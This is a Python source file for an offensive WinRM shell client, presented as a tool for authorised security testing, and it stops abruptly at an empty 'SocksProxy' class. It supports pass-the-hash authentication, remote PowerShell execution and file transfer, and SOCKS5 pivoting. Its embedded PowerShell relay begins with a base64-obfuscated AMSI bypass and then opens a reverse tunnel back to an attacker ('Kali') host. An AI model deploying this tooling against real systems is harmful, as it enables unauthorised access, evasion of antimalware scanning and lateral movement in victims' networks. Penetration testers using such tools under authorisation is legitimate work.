#!/usr/bin/env python3
"""
WinRM Shell - Custom WinRM Client for Authorized Security Testing
Raw WSMan/SOAP implementation - no pywinrm dependency.
Dependencies: pip install requests requests-ntlm
Optional:     pip install requests-kerberos pyreadline3
"""

import argparse
import base64
import cmd
import os
import re
import socket
import struct
import sys
import threading
import time
import uuid
import xml.etree.ElementTree as ET
from datetime import datetime
from pathlib import Path

try:
    import requests
    from requests.auth import HTTPBasicAuth
    requests.packages.urllib3.disable_warnings()
except ImportError:
    sys.exit("[!] Missing dependency: pip install requests")

try:
    from requests_ntlm import HttpNtlmAuth
    HAS_NTLM = True
except ImportError:
    HAS_NTLM = False

try:
    from requests_kerberos import HTTPKerberosAuth, REQUIRED
    HAS_KERBEROS = True
except ImportError:
    HAS_KERBEROS = False

try:
    import readline
except ImportError:
    try:
        import pyreadline3 as readline
    except ImportError:
        readline = None

# -- ANSI colors ---------------------------------------------------------------

if sys.platform == "win32":
    os.system("")  # enable VT100 on Windows 10+

class C:
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN    = "\033[96m"
    WHITE   = "\033[97m"
    BOLD    = "\033[1m"
    RESET   = "\033[0m"

NO_COLOR = False
DEBUG = False

def co(text, color):
    if NO_COLOR:
        return text
    return f"{color}{text}{C.RESET}"

def info(msg):
    print(co("[*] ", C.BLUE) + msg)

def good(msg):
    print(co("[+] ", C.GREEN) + msg)

def warn(msg):
    print(co("[!] ", C.YELLOW) + msg)

def error(msg):
    print(co("[-] ", C.RED) + msg)

# -- WSMan protocol constants --------------------------------------------------

XMLNS_SOAP      = "http://www.w3.org/2003/05/soap-envelope"
XMLNS_WSA       = "http://schemas.xmlsoap.org/ws/2004/08/addressing"
XMLNS_WSMAN     = "http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
XMLNS_WSMAN_MS  = "http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"
XMLNS_RSP       = "http://schemas.microsoft.com/wbem/wsman/1/windows/shell"
XMLNS_FAULT     = "http://schemas.microsoft.com/wbem/wsman/1/wsmanfault"
ANONYMOUS       = "http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous"
RESOURCE_CMD    = "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd"

ACTION_CREATE  = "http://schemas.xmlsoap.org/ws/2004/09/transfer/Create"
ACTION_DELETE  = "http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete"
ACTION_COMMAND = "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command"
ACTION_RECEIVE = "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive"
ACTION_SIGNAL  = "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Signal"
ACTION_SEND    = "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Send"
SIGNAL_TERM    = "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/signal/terminate"
STATE_DONE     = "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/CommandState/Done"

CHUNK_SIZE = 102400  # 100 KB for file transfers

# -- NTLM Message Encryption (MS-WSMV 2.2.9.1) --------------------------------

MIME_BOUNDARY = b"--Encrypted Boundary"
PROTOCOL_STRING = b"application/HTTP-SPNEGO-session-encrypted"


class NTLMEncryption:
    """Encrypt/decrypt WinRM SOAP payloads with NTLM session security.

    Windows WinRM defaults to AllowUnencrypted=false, requiring message-level
    encryption when using HTTP (not HTTPS). This class wraps SOAP messages
    using the NTLM session key negotiated during HTTP authentication.
    """

    def __init__(self, session):
        self.session = session

    def encrypt(self, message_bytes):
        """Encrypt a SOAP message, return (body_bytes, content_type_header)."""
        sealed, signature = self.session.auth.session_security.wrap(message_bytes)
        sig_len = struct.pack("<i", len(signature))
        encrypted_stream = sig_len + signature + sealed
        msg_len = str(len(message_bytes)).encode()

        payload = (
            MIME_BOUNDARY + b"\r\n"
            b"\tContent-Type: " + PROTOCOL_STRING + b"\r\n"
            b"\tOriginalContent: type=application/soap+xml;charset=UTF-8;"
            b"Length=" + msg_len + b"\r\n"
            + MIME_BOUNDARY + b"\r\n"
            b"\tContent-Type: application/octet-stream\r\n"
            + encrypted_stream
            + MIME_BOUNDARY + b"--\r\n"
        )
        ct = (
            'multipart/encrypted;'
            f'protocol="{PROTOCOL_STRING.decode()}";'
            'boundary="Encrypted Boundary"'
        )
        return payload, ct

    def decrypt(self, response):
        """Decrypt a WinRM response if it is encrypted, else return raw bytes."""
        ct = response.headers.get("Content-Type", "")
        if PROTOCOL_STRING.decode() not in ct:
            return response.content

        parts = response.content.split(MIME_BOUNDARY + b"\r\n")
        parts = [p for p in parts if p]
        message = b""
        for i in range(0, len(parts), 2):
            header = parts[i].strip()
            payload = parts[i + 1] if i + 1 < len(parts) else b""

            expected_length = int(header.split(b"Length=")[1])
            if payload.endswith(MIME_BOUNDARY + b"--\r\n"):
                payload = payload[: -len(MIME_BOUNDARY + b"--\r\n")]
            encrypted_data = payload.replace(
                b"\tContent-Type: application/octet-stream\r\n", b""
            )

            sig_len_val = struct.unpack("<i", encrypted_data[:4])[0]
            signature = encrypted_data[4: sig_len_val + 4]
            sealed_msg = encrypted_data[sig_len_val + 4:]
            decrypted = self.session.auth.session_security.unwrap(sealed_msg, signature)

            if len(decrypted) != expected_length:
                raise WinRMError("Decrypted length mismatch - message may be tampered")
            message += decrypted
        return message

# -- Tunnel relay script (runs on the target) ----------------------------------

RELAY_PS = r"""
$ErrorActionPreference='Stop'
$c=[Net.Sockets.TcpClient]::new()
$c.SendTimeout=10000
$c.ReceiveTimeout=1000
$c.NoDelay=$true
try{$c.Connect('__HOST__',__PORT__)}catch{[Console]::Error.WriteLine($_);exit 1}
$s=$c.GetStream()
$i=[Console]::OpenStandardInput()
$o=[Console]::OpenStandardOutput()
$b=New-Object byte[] 65536
$ib=New-Object byte[] 65536
$ia=$null
$o.WriteByte(1);$o.Flush()
try{
while($c.Connected){
if($s.DataAvailable){
$n=$s.Read($b,0,$b.Length)
if($n -gt 0){$o.Write($b,0,$n);$o.Flush()}else{break}
}
if($ia -eq $null){$ia=$i.BeginRead($ib,0,$ib.Length,$null,$null)}
if($ia.AsyncWaitHandle.WaitOne(0)){
$n=$i.EndRead($ia)
if($n -gt 0){$s.Write($ib,0,$n);$s.Flush()}else{break}
$ia=$null
}
[Threading.Thread]::Sleep(1)
}
}catch{}
try{$c.Close()}catch{}
""".strip()

# -- Reverse tunnel relay script (runs on the target) --------------------------
# Multiplexed TCP tunnel: connects back to Kali over a single TCP connection,
# then opens/relays multiple TCP connections on demand (SOCKS-driven).
# Frame format: [1B type][2B channel BE][4B length BE][payload]
# Types: 0x01=CONNECT, 0x02=CONNECT_RESP, 0x03=DATA, 0x04=CLOSE, 0xFF=READY

TUNNEL_RELAY_PS = r"""
try{$e=[Text.Encoding]::UTF8;$t=[Ref].Assembly.GetType($e.GetString([Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM=")));$f=$t.GetField($e.GetString([Convert]::FromBase64String("YW1zaUluaXRGYWlsZWQ=")),"NonPublic,Static");$f.SetValue($null,$true)}catch{}
$code=@"
using System;
using System.Collections.Concurrent;
using System.Net.Sockets;
using System.Text;
using System.Threading;

public class R{
    static NetworkStream ms;
    static ConcurrentDictionary<int,TcpClient> ch=new ConcurrentDictionary<int,TcpClient>();
    static object wl=new object();

    static void WF(byte t,int c,byte[] d,int n){
        var h=new byte[7];
        h[0]=t;h[1]=(byte)(c>>8);h[2]=(byte)c;
        h[3]=(byte)(n>>24);h[4]=(byte)(n>>16);h[5]=(byte)(n>>8);h[6]=(byte)n;
        lock(wl){ms.Write(h,0,7);if(n>0)ms.Write(d,0,n);ms.Flush();}
    }

    static byte[] RX(int n){
        var b=new byte[n];int o=0;
        while(o<n){int r=ms.Read(b,o,n-o);if(r==0)return null;o+=r;}
        return b;
    }

    static void CR(object state){
        var a=(object[])state;var tc=(TcpClient)a[0];int ci=(int)a[1];
        var buf=new byte[65536];
        try{var ts=tc.GetStream();
            while(true){int n=ts.Read(buf,0,buf.Length);if(n<=0)break;WF(3,ci,buf,n);}
        }catch{}
        WF(4,ci,new byte[0],0);
        TcpClient rm;ch.TryRemove(ci,out rm);
    }

    public static void Run(string host,int port){
        var c=new TcpClient();c.NoDelay=true;
        c.SendBufferSize=262144;c.ReceiveBufferSize=262144;
        c.Connect(host,port);ms=c.GetStream();
        WF(0xFF,0,new byte[]{1},1);
        while(c.Connected){
            var h=RX(7);if(h==null)break;
            int t=h[0],ci=(h[1]<<8)|h[2],ln=(h[3]<<24)|(h[4]<<16)|(h[5]<<8)|h[6];
            var d=ln>0?RX(ln):new byte[0];if(d==null)break;
            if(t==1){
                var tgt=Encoding.ASCII.GetString(d);var p=tgt.Split(':');
                try{var tc=new TcpClient();tc.NoDelay=true;
                    tc.SendBufferSize=262144;tc.ReceiveBufferSize=262144;
                    tc.Connect(p[0],int.Parse(p[1]));
                    ch[ci]=tc;WF(2,ci,new byte[]{0},1);
                    ThreadPool.QueueUserWorkItem(CR,new object[]{tc,ci});
                }catch{WF(2,ci,new byte[]{1},1);}
            }else if(t==3){
                TcpClient tc;if(ch.TryGetValue(ci,out tc))
                    try{tc.GetStream().Write(d,0,d.Length);}catch{}
            }else if(t==4){
                TcpClient rm;if(ch.TryRemove(ci,out rm))try{rm.Close();}catch{}
            }
        }
        foreach(var kv in ch)try{kv.Value.Close();}catch{}
        c.Close();
    }
}
"@
Add-Type -TypeDefinition $code
[R]::Run('__KALI__',__PORT__)
""".strip()

# -- WinRM Client --------------------------------------------------------------

class WinRMError(Exception):
    pass


class WinRMClient:
    def __init__(self, host, port=5985, username="", password="",
                 domain="", use_ssl=False, verify_ssl=False,
                 auth_type="ntlm", nt_hash=None, timeout=60):
        scheme = "https" if use_ssl else "http"
        self.endpoint = f"{scheme}://{host}:{port}/wsman"
        self.host = host
        self.timeout = timeout
        self.shell_id = None
        self._cwd_marker = f"::CWD_{uuid.uuid4().hex[:8]}::"
        self._lock = threading.RLock()

        self.session = requests.Session()
        self.session.verify = verify_ssl
        self.session.headers.update({
            "Content-Type": "application/soap+xml;charset=UTF-8",
            "User-Agent": "Microsoft WinRM Client",
            "Connection": "Keep-Alive",
        })

        self.encryption = None
        self.auth_type = auth_type
        self._ntlm_user = None
        self._ntlm_pass = None
        self._use_ssl = use_ssl

        if auth_type == "kerberos":
            if not HAS_KERBEROS:
                raise WinRMError("Kerberos auth requires: pip install requests-kerberos")
            self.session.auth = HTTPKerberosAuth(mutual_authentication=REQUIRED)
        elif auth_type == "ntlm":
            if not HAS_NTLM:
                raise WinRMError("NTLM auth requires: pip install requests-ntlm")
            user = f"{domain}\\{username}" if domain else username
            if nt_hash:
                password = f"aad3b435b51404eeaad3b435b51404ee:{nt_hash}"
            self._ntlm_user = user
            self._ntlm_pass = password
            self.session.auth = HttpNtlmAuth(user, password)
            # NTLM message encryption is required for HTTP (AllowUnencrypted=false)
            if not use_ssl:
                self._init_ntlm_encryption()
        elif auth_type == "basic":
            self.session.auth = HTTPBasicAuth(username, password)

    def _init_ntlm_encryption(self):
        """Send a blank request to establish the NTLM security context,
        then set up message encryption using the negotiated session key."""
        try:
            r = self.session.post(self.endpoint, data=None, timeout=self.timeout)
            # 401/200 both acceptable here - the goal is to complete NTLM handshake
        except requests.ConnectionError:
            pass  # will fail later on real requests

        if hasattr(self.session.auth, "session_security") and self.session.auth.session_security:
            self.encryption = NTLMEncryption(self.session)
            if DEBUG:
                info("NTLM message encryption enabled")
        elif DEBUG:
            warn("NTLM session_security not available, sending unencrypted")

    def _rebuild_session(self):
        """Recreate HTTP session and NTLM encryption from scratch."""
        old_verify = self.session.verify
        old_headers = dict(self.session.headers)
        try:
            self.session.close()
        except Exception:
            pass
        self.shell_id = None
        self.encryption = None
        self.session = requests.Session()
        self.session.verify = old_verify
        self.session.headers.update(old_headers)
        if self.auth_type == "ntlm" and self._ntlm_user:
            self.session.auth = HttpNtlmAuth(self._ntlm_user, self._ntlm_pass)
            if not self._use_ssl:
                self._init_ntlm_encryption()
        elif self.auth_type == "kerberos":
            self.session.auth = HTTPKerberosAuth(mutual_authentication=REQUIRED)

    def clone(self):
        """Create an independent clone with its own HTTP session and NTLM context."""
        c = WinRMClient.__new__(WinRMClient)
        c.endpoint = self.endpoint
        c.host = self.host
        c.timeout = self.timeout
        c.shell_id = None
        c._cwd_marker = self._cwd_marker
        c._lock = threading.RLock()
        c.auth_type = self.auth_type
        c._ntlm_user = self._ntlm_user
        c._ntlm_pass = self._ntlm_pass
        c._use_ssl = self._use_ssl
        c.encryption = None
        c.session = requests.Session()
        c.session.verify = self.session.verify
        c.session.headers.update(self.session.headers)
        # Each clone needs its own auth object (NTLM session security is stateful)
        if self.auth_type == "ntlm" and self._ntlm_user:
            c.session.auth = HttpNtlmAuth(self._ntlm_user, self._ntlm_pass)
            if self.encryption:
                c._init_ntlm_encryption()
        else:
            c.session.auth = self.session.auth
        return c

    # -- SOAP envelope builder -------------------------------------------------

    def _envelope(self, action, body="", shell_id=None, options=None,
                  max_env=153600, op_timeout=None):
        msg_id = uuid.uuid4()
        timeout = op_timeout if op_timeout is not None else self.timeout
        selector = ""
        if shell_id:
            selector = (
                f'<wsman:SelectorSet>'
                f'<wsman:Selector Name="ShellId">{shell_id}</wsman:Selector>'
                f'</wsman:SelectorSet>'
            )
        opt_set = ""
        if options:
            items = "".join(
                f'<wsman:Option Name="{k}">{v}</wsman:Option>'
                for k, v in options.items()
            )
            opt_set = f"<wsman:OptionSet>{items}</wsman:OptionSet>"

        return (
            f'<?xml version="1.0" encoding="UTF-8"?>'
            f'<s:Envelope xmlns:s="{XMLNS_SOAP}" xmlns:wsa="{XMLNS_WSA}" '
            f'xmlns:wsman="{XMLNS_WSMAN}" xmlns:p="{XMLNS_WSMAN_MS}" '
            f'xmlns:rsp="{XMLNS_RSP}">'
            f'<s:Header>'
            f'<wsa:To>{self.endpoint}</wsa:To>'
            f'<wsman:ResourceURI s:mustUnderstand="true">{RESOURCE_CMD}</wsman:ResourceURI>'
            f'<wsa:ReplyTo>'
            f'<wsa:Address s:mustUnderstand="true">{ANONYMOUS}</wsa:Address>'
            f'</wsa:ReplyTo>'
            f'<wsa:Action s:mustUnderstand="true">{action}</wsa:Action>'
            f'<wsman:MaxEnvelopeSize s:mustUnderstand="true">{max_env}</wsman:MaxEnvelopeSize>'
            f'<wsa:MessageID>uuid:{msg_id}</wsa:MessageID>'
            f'<wsman:Locale xml:lang="en-US" s:mustUnderstand="false"/>'
            f'<p:DataLocale xml:lang="en-US" s:mustUnderstand="false"/>'
            f'<wsman:OperationTimeout>PT{timeout}S</wsman:OperationTimeout>'
            f'{selector}{opt_set}'
            f'</s:Header>'
            f'<s:Body>{body}</s:Body>'
            f'</s:Envelope>'
        )

    # -- HTTP transport --------------------------------------------------------

    def _send(self, xml_payload, http_timeout=None, quiet=False):
        timeout = http_timeout if http_timeout is not None else self.timeout + 10
        with self._lock:
            try:
                if self.encryption:
                    body_bytes, content_type = self.encryption.encrypt(
                        xml_payload.encode("utf-8")
                    )
                    r = self.session.post(
                        self.endpoint,
                        data=body_bytes,
                        timeout=timeout,
                        headers={"Content-Type": content_type},
                    )
                else:
                    r = self.session.post(
                        self.endpoint,
                        data=xml_payload.encode("utf-8"),
                        timeout=timeout,
                    )
            except requests.ConnectionError as e:
                raise WinRMError(f"Connection failed: {e}")
            except requests.Timeout:
                raise WinRMError("Request timed out")

        if r.status_code == 401:
            raise WinRMError("Authentication failed (401)")
        if r.status_code == 403:
            raise WinRMError("Access denied (403)")

        # Decrypt response if encrypted
        if self.encryption:
            response_data = self.encryption.decrypt(r)
            response_text = response_data.decode("utf-8", errors="replace")
        else:
            response_text = r.text

        if r.status_code not in (200,):
            if DEBUG and not quiet:
                warn(f"HTTP {r.status_code} raw response:\n{response_text[:2000]}")
            fault = self._parse_fault(response_text)
            raise WinRMError(fault or f"HTTP {r.status_code}")

        return ET.fromstring(response_text)

    def _parse_fault(self, xml_text):
        """Parse SOAP fault responses, including Microsoft WSManFault details."""
        try:
            root = ET.fromstring(xml_text)
        except ET.ParseError:
            return None

        # Extract SOAP Reason text
        reason = root.find(".//{%s}Text" % XMLNS_SOAP)
        reason_text = reason.text.strip() if (reason is not None and reason.text) else ""

        # Look for WSManFault in the correct Microsoft namespace
        detail = root.find(".//{%s}WSManFault" % XMLNS_FAULT)
        if detail is not None:
            code = detail.get("Code", "")
            # Message can be an attribute or a child element
            msg = detail.get("Message", "")
            msg_el = detail.find("{%s}Message" % XMLNS_FAULT)
            if msg_el is not None and msg_el.text:
                msg = msg_el.text.strip()
            # Also check for ProviderFault inside Message element
            if msg_el is not None:
                pf = msg_el.find(".//{%s}ProviderFault" % XMLNS_FAULT)
                if pf is not None and pf.text:
                    msg = pf.text.strip()
            fault_str = f"WSManFault {code}: {msg}" if code else msg
            if reason_text:
                fault_str = f"{reason_text} -- {fault_str}"
            return fault_str if fault_str.strip() else None

        # Fallback: try the old DMTF namespace (some non-Microsoft implementations)
        detail_old = root.find(".//{%s}WSManFault" % XMLNS_WSMAN)
        if detail_old is not None:
            msg = detail_old.get("Message", "Unknown WSMan fault")
            return msg

        return reason_text or None

    # -- Shell lifecycle -------------------------------------------------------

    def create_shell(self, codepage=65001, noprofile=True):
        """Create a new shell, return its ID without setting it as default."""
        opts = {"WINRS_NOPROFILE": "TRUE" if noprofile else "FALSE",
                "WINRS_CODEPAGE": str(codepage)}
        body = (
            '<rsp:Shell>'
            '<rsp:InputStreams>stdin</rsp:InputStreams>'
            '<rsp:OutputStreams>stdout stderr</rsp:OutputStreams>'
            '</rsp:Shell>'
        )
        xml = self._envelope(ACTION_CREATE, body, options=opts)
        root = self._send(xml)
        sid = root.find(".//{%s}ShellId" % XMLNS_RSP)
        if sid is None:
            raise WinRMError("Failed to create shell: no ShellId in response")
        return sid.text

    def open_shell(self, codepage=65001, noprofile=True):
        """Create a new shell and set it as the default."""
        self.shell_id = self.create_shell(codepage, noprofile)
        return self.shell_id

    def close_shell(self, shell_id=None):
        sid = shell_id or self.shell_id
        if not sid:
            return
        try:
            xml = self._envelope(ACTION_DELETE, shell_id=sid)
            self._send(xml)
        except Exception:
            pass
        if sid == self.shell_id:
            self.shell_id = None

    def _ensure_shell(self):
        if not self.shell_id:
            self.open_shell()

    # -- Command execution -----------------------------------------------------

    def run_command(self, shell_id, command, args=None):
        arg_xml = ""
        if args:
            for a in (args if isinstance(args, list) else [args]):
                arg_xml += f"<rsp:Arguments>{a}</rsp:Arguments>"
        body = (
            f'<rsp:CommandLine>'
            f'<rsp:Command>{command}</rsp:Command>'
            f'{arg_xml}'
            f'</rsp:CommandLine>'
        )
        opts = {
            "WINRS_CONSOLEMODE_STDIN": "TRUE",
            "WINRS_SKIP_CMD_SHELL": "FALSE",
        }
        xml = self._envelope(ACTION_COMMAND, body, shell_id, options=opts)
        root = self._send(xml)
        cid = root.find(".//{%s}CommandId" % XMLNS_RSP)
        if cid is None:
            raise WinRMError("No CommandId in response")
        return cid.text

    def get_output(self, shell_id, command_id):
        stdout_parts = []
        stderr_parts = []
        exit_code = -1
        done = False

        while not done:
            body = (
                f'<rsp:Receive>'
                f'<rsp:DesiredStream CommandId="{command_id}">stdout stderr</rsp:DesiredStream>'
                f'</rsp:Receive>'
            )
            xml = self._envelope(ACTION_RECEIVE, body, shell_id,
                                 max_env=8388608)
            root = self._send(xml)

            for stream in root.findall(".//{%s}Stream" % XMLNS_RSP):
                if stream.text:
                    decoded = base64.b64decode(stream.text)
                    name = stream.get("Name", "")
                    if name == "stdout":
                        stdout_parts.append(decoded)
                    elif name == "stderr":
                        stderr_parts.append(decoded)

            state_el = root.find(".//{%s}CommandState" % XMLNS_RSP)
            if state_el is not None:
                state = state_el.get("State", "")
                if state.endswith("Done"):
                    done = True
                    ec = state_el.find("{%s}ExitCode" % XMLNS_RSP)
                    if ec is not None and ec.text is not None:
                        exit_code = int(ec.text)

        stdout = b"".join(stdout_parts).decode("utf-8", errors="replace")
        stderr = b"".join(stderr_parts).decode("utf-8", errors="replace")
        return stdout, stderr, exit_code

    def receive_partial(self, shell_id, command_id, timeout=3):
        """Single Receive call with short timeout -- returns available data without
        waiting for the command to finish. Used by the SOCKS tunnel relay."""
        body = (
            f'<rsp:Receive>'
            f'<rsp:DesiredStream CommandId="{command_id}">stdout stderr</rsp:DesiredStream>'
            f'</rsp:Receive>'
        )
        xml = self._envelope(ACTION_RECEIVE, body, shell_id,
                             max_env=8388608, op_timeout=timeout)
        try:
            root = self._send(xml, http_timeout=timeout + 5, quiet=True)
        except WinRMError:
            return b"", b"", False

        stdout = b""
        stderr = b""
        done = False
        for stream in root.findall(".//{%s}Stream" % XMLNS_RSP):
            if stream.text:
                decoded = base64.b64decode(stream.text)
                if stream.get("Name") == "stdout":
                    stdout += decoded
                elif stream.get("Name") == "stderr":
                    stderr += decoded
        state_el = root.find(".//{%s}CommandState" % XMLNS_RSP)
        if state_el is not None and state_el.get("State", "").endswith("Done"):
            done = True
        return stdout, stderr, done

    def send_input(self, shell_id, command_id, data):
        """Send raw bytes to a running command's stdin via WSMan Send."""
        b64 = base64.b64encode(data).decode("ascii")
        body = (
            f'<rsp:Send>'
            f'<rsp:Stream Name="stdin" CommandId="{command_id}">{b64}</rsp:Stream>'
            f'</rsp:Send>'
        )
        xml = self._envelope(ACTION_SEND, body, shell_id)
        self._send(xml)

    def signal_terminate(self, shell_id, command_id):
        body = (
            f'<rsp:Signal CommandId="{command_id}">'
            f'<rsp:Code>{SIGNAL_TERM}</rsp:Code>'
            f'</rsp:Signal>'
        )
        xml = self._envelope(ACTION_SIGNAL, body, shell_id)
        try:
            self._send(xml)
        except Exception:
            pass

    def execute(self, command, args=None):
        self._ensure_shell()
        cmd_id = self.run_command(self.shell_id, command, args)
        try:
            stdout, stderr, rc = self.get_output(self.shell_id, cmd_id)
        finally:
            self.signal_terminate(self.shell_id, cmd_id)
        return stdout, stderr, rc

    # -- PowerShell execution --------------------------------------------------

    def _ps_encode(self, ps_command):
        return base64.b64encode(
            ps_command.encode("utf-16-le")
        ).decode("ascii")

    def execute_ps(self, ps_command):
        encoded = self._ps_encode(ps_command)
        return self.execute(
            "powershell.exe",
            ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass",
             "-EncodedCommand", encoded]
        )

    def execute_ps_with_cwd(self, ps_command, cwd):
        full = (
            f'Set-Location -LiteralPath "{cwd}" -ErrorAction SilentlyContinue; '
            f'{ps_command}; '
            f'Write-Output ("{self._cwd_marker}$((Get-Location).Path)")'
        )
        stdout, stderr, rc = self.execute_ps(full)
        new_cwd = cwd
        lines = stdout.rstrip("\r\n").split("\n")
        clean_lines = []
        for line in lines:
            if self._cwd_marker in line:
                new_cwd = line.split(self._cwd_marker, 1)[1].strip()
            else:
                clean_lines.append(line)
        stdout_clean = "\n".join(clean_lines)
        if stdout_clean.endswith("\n"):
            stdout_clean = stdout_clean[:-1]
        return stdout_clean, stderr, rc, new_cwd

    # -- File transfer ---------------------------------------------------------

    def upload(self, local_path, remote_path, progress_cb=None):
        with open(local_path, "rb") as f:
            data = f.read()

        total = len(data)
        self._ensure_shell()

        ps = (
            '$i=[Console]::OpenStandardInput();'
            '$h=New-Object byte[] 8;$r=0;'
            'while($r -lt 8){$n=$i.Read($h,$r,8-$r);if($n -le 0){exit 1};$r+=$n};'
            '$sz=[BitConverter]::ToInt64($h,0);'
            f'$f=[IO.File]::Create("{remote_path}");'
            '$b=New-Object byte[] 65536;$w=[long]0;'
            'while($w -lt $sz){'
            '$n=$i.Read($b,0,[Math]::Min($b.Length,$sz-$w));'
            'if($n -le 0){break};$f.Write($b,0,$n);$w+=$n};'
            '$f.Close();Write-Output "DONE:$w"'
        )
        encoded = self._ps_encode(ps)
        cmd_id = self.run_command(
            self.shell_id, "powershell.exe",
            ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass",
             "-EncodedCommand", encoded]
        )

        try:
            self.send_input(self.shell_id, cmd_id, struct.pack('<q', total))

            uploaded = 0
            for offset in range(0, total, CHUNK_SIZE):
                chunk = data[offset:offset + CHUNK_SIZE]
                self.send_input(self.shell_id, cmd_id, chunk)
                uploaded += len(chunk)
                if progress_cb:
                    progress_cb(uploaded, total)

            stdout, stderr, rc = self.get_output(self.shell_id, cmd_id)
        finally:
            self.signal_terminate(self.shell_id, cmd_id)

        if rc != 0 or "DONE:" not in (stdout or ""):
            raise WinRMError(
                f"Upload failed: {(stderr or stdout or 'unknown error').strip()}"
            )

        return total

    def download(self, remote_path, local_path, progress_cb=None):
        stdout, stderr, rc = self.execute_ps(
            f'(Get-Item -LiteralPath "{remote_path}" -ErrorAction Stop).Length'
        )
        if rc != 0:
            raise WinRMError(f"Cannot access remote file: {stderr.strip()}")
        file_size = int(stdout.strip())

        parts = []
        offset = 0
        while offset < file_size:
            read_size = min(CHUNK_SIZE, file_size - offset)
            ps = (
                f'$s=[IO.File]::OpenRead("{remote_path}");'
                f'$b=New-Object byte[] {read_size};'
                f'$s.Seek({offset},[IO.SeekOrigin]::Begin)|Out-Null;'
                f'$n=$s.Read($b,0,$b.Length);$s.Close();'
                f'[Convert]::ToBase64String($b[0..($n-1)])'
            )
            stdout, stderr, rc = self.execute_ps(ps)
            if rc != 0:
                raise WinRMError(f"Download chunk failed: {stderr.strip()}")
            chunk = base64.b64decode(stdout.strip())
            parts.append(chunk)
            offset += len(chunk)
            if progress_cb:
                progress_cb(offset, file_size)

        with open(local_path, "wb") as f:
            for part in parts:
                f.write(part)
        return file_size

    def disconnect(self):
        self.close_shell()
        self.session.close()


# -- SOCKS5 Proxy over WinRM --------------------------------------------------

class TunnelConnection:
    """Manages a single SOCKS-proxied TCP connection relayed through WinRM."""

    def __init__(self, main_client, local_sock, addr):
        # Separate clients for reader/writer to avoid lock contention:
        # WinRM Receive polls block for seconds; if reader and writer share
        # a lock, the writer can't send data while the reader waits.
        self.read_client = main_client.clone()
        self.write_client = main_client.clone()
        self.local_sock = local_sock
        self.addr = addr
        self.active = True
        self.shell_id = None
        self.command_id = None
        self.dst = None

    def handle(self):
        try:
            dst = self._socks5_handshake()
            if dst is None:
                return
            self.dst = dst
            host, port = dst

            self.shell_id = self.write_client.create_shell()

            script = RELAY_PS.replace("__HOST__", host).replace("__PORT__", str(port))
            encoded = self.write_client._ps_encode(script)
            self.command_id = self.write_client.run_command(
                self.shell_id, "powershell.exe",
                ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass",
                 "-EncodedCommand", encoded]
            )

            # Wait for connection confirmation (byte 0x01)
            stdout, stderr, done = self.read_client.receive_partial(
                self.shell_id, self.command_id, timeout=15
            )
            if done or (not stdout) or stdout[0:1] != b"\x01":
                err_msg = stderr.decode("utf-8", errors="replace").strip() if stderr else "connection refused"
                self._socks5_reply(0x05)  # connection refused
                return
            # Strip the marker byte, keep any trailing data
            first_data = stdout[1:]

            self._socks5_reply(0x00)  # success

            # Start relay threads
            reader = threading.Thread(target=self._relay_remote_to_local, daemon=True)
            writer = threading.Thread(target=self._relay_local_to_remote, daemon=True)
            reader.start()
            writer.start()

            # Send any data that came with the handshake response
            if first_data:
                try:
                    self.local_sock.sendall(first_data)
                except OSError:
                    self.active = False

            reader.join()
            writer.join()
        except Exception:
            pass
        finally:
            self.close()

    def _relay_remote_to_local(self):
        """Long-poll WinRM Receive: the server holds the response until data
        is available, then responds immediately (~70ms). No wasted idle polls."""
        while self.active:
            try:
                stdout, _, done = self.read_client.receive_partial(
                    self.shell_id, self.command_id, timeout=10
                )
                if stdout:
                    self.local_sock.sendall(stdout)
                if done:
                    break
            except (OSError, WinRMError):
                break
        self.active = False

    def _relay_local_to_remote(self):
        """Read from local SOCKS client and send to the remote via WinRM Send."""
        while self.active:
            try:
                self.local_sock.settimeout(2.0)
                data = self.local_sock.recv(65536)
                if not data:
                    break
                self.write_client.send_input(
                    self.shell_id, self.command_id, data
                )
            except socket.timeout:
                continue
            except (OSError, WinRMError):
                break
        self.active = False

    def _socks5_handshake(self):
        """Perform SOCKS5 negotiation, return (host, port) or None."""
        try:
            data = self.local_sock.recv(256)
            if len(data) < 2 or data[0] != 0x05:
                self.local_sock.close()
                return None
            self.local_sock.sendall(b"\x05\x00")  # no auth

            data = self.local_sock.recv(512)
            if len(data) < 7 or data[1] != 0x01:  # CONNECT only
                self._socks5_reply(0x07)
                return None

            atyp = data[3]
            if atyp == 0x01:  # IPv4
                dst_addr = socket.inet_ntoa(data[4:8])
                dst_port = struct.unpack("!H", data[8:10])[0]
            elif atyp == 0x03:  # Domain
                dlen = data[4]
                dst_addr = data[5 : 5 + dlen].decode("ascii", errors="replace")
                dst_port = struct.unpack("!H", data[5 + dlen : 7 + dlen])[0]
            elif atyp == 0x04:  # IPv6
                dst_addr = socket.inet_ntop(socket.AF_INET6, data[4:20])
                dst_port = struct.unpack("!H", data[20:22])[0]
            else:
                self._socks5_reply(0x08)
                return None
            return (dst_addr, dst_port)
        except OSError:
            return None

    def _socks5_reply(self, status):
        try:
            self.local_sock.sendall(
                b"\x05" + bytes([status]) + b"\x00\x01"
                + b"\x00\x00\x00\x00\x00\x00"
            )
        except OSError:
            pass
        if status != 0x00:
            try:
                self.local_sock.close()
            except OSError:
                pass

    def close(self):
        self.active = False
        if self.command_id and self.shell_id:
            self.write_client.signal_terminate(self.shell_id, self.command_id)
            self.command_id = None
        if self.shell_id:
            self.write_client.close_shell(self.shell_id)
            self.shell_id = None
        try:
            self.local_sock.close()
        except OSError:
            pass
        self.read_client.session.close()
        self.write_client.session.close()


class SocksProxy:
